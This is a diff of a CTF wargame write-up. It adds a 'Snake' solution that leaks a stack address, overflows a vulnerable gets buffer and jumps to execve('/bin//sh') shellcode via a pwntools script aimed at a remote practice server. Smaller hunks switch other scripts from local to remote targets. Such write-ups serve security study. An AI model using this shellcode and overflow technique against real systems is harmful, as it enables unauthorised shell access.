@@ -19,7 +19,7 @@ An offset of 1 byte was required to byte-align the values.
 from pwn import *
 import re
 
-p = process("./door")
+# p = process("./door")
 p = remote('plsdonthaq.me', 4001)
 
 p.recvuntil(b'A landslide has blocked the way at ')
@@ -51,6 +51,80 @@ p.interactive()
 
 ---
 
+# Snake
+
+> Flag: `FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1zbmFrZSIsImlwIjoiMjAyLjg3LjE2Mi4yOCIsInNlc3Npb24iOiI4YjQ0OWFhYi0xMjRlLTQxYTctYjhhYi0xOGExZGU4NDIxM2UifQ.ZGUuLpimuOjUDwUJxO5p2KU9W2ZwpjLWDYcq_kKrL2w}`
+
+## Scenario
+
+In the main program loop, there is a stack address leakable through the Print Flag option - if you enter the password.  
+There is no win function, and the flag address probably doesn't have a flag... But we do have a vulnerable `gets` function, and an executable stack :hm:...
+
+## Solution
+
+A static analysis of the program reveals that any password greater than 0x50 bytes long is considered correct.  
+From here, we learn about an address on the stack; which we can use to find the ebp and esp addresses for that frame.  
+There is a vulnerable `gets` function in the `get_name` function, which we can populate with shellcode to launch a shell.  
+To overflow the return address, we can find out (I'm not too sure how exactly to determine this, but I compared values during runtime with gdb) that the ebp address for the new frame is 0x78 bytes away from the calling frame - so we can do some maths to figure out the address of the start of the buffer. By overflowing the buffer and the return address, we can execute our shellcode to get the flag
+
+## Script
+
+```python3
+from pwn import *
+import re
+
+# p = process("./snake")
+p = remote('plsdonthaq.me', 4002)
+
+# Vulnerable `gets(ebp-0x32)`
+
+# password prompt reads 0x63 bytes
+# The error message which leaks an address on the stack when anything greater than 0x50 (80) characters is passed in
+p.sendline(b"3")
+p.sendline(b"*" * 80)
+p.recvuntil("Error occurred while printing flag at offset ")
+
+flagAddress = int(p.recvline(keepends=False), 16)
+print(f"Flag Address at = {hex(flagAddress)}")
+# It's not actually a flag address though - the flag isn't loaded anywhere
+
+ebp = flagAddress + 0xc
+print(f"Calculated read_option::ebp = {hex(ebp)}")
+
+# Shellcode for `execve("/bin//sh", NULL, NULL, NULL)`
+assembly = f"""
+   push 0x68732f2f
+   push 0x6e69622f
+
+   mov ebx, esp
+
+   mov eax, 0xb
+   xor ecx, ecx
+   xor edx, edx
+   xor esi, esi
+   int 0x80
+"""
+shellcode = asm(re.sub('#.*$', '', assembly, flags=re.MULTILINE))
+
+# get_name()'s ebp is 0x78 away
+getName_ebp = ebp - 0x78
+
+p.sendline(b"1")
+
+pause()
+payload = b""
+payload += b'\x90' * (0x32 - len(shellcode))
+payload += shellcode
+payload += b'yeet' # Okay, not toooooo sure why I need this here, but it crashes if I don't.
+payload += p32(getName_ebp - 0x32)
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+---
+
 # For Matrix
 
 > Flag: `FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNC1mb3JtYXRyaXgiLCJpcCI6IjIwMi44Ny4xNjIuMjgiLCJzZXNzaW9uIjoiYjdmNWU1MTEtMzU1Ni00ZTgxLWJmZWYtNzZiOTM2YTUwMjBlIn0.Wdz38UVHLuCjsYl7tNDFYM33ltvbVUcSEIDTYj4-SCM}`
@@ -73,7 +147,7 @@ We can push the four addresses of the bytes containing the `printf` GOT entry, a
 from pwn import *
 import re
 
-p = process("./formatrix")
+# p = process("./formatrix")
 p = remote('plsdonthaq.me', 4003)
 
 # fgets(ebp-0x208, 0x200, stdin)
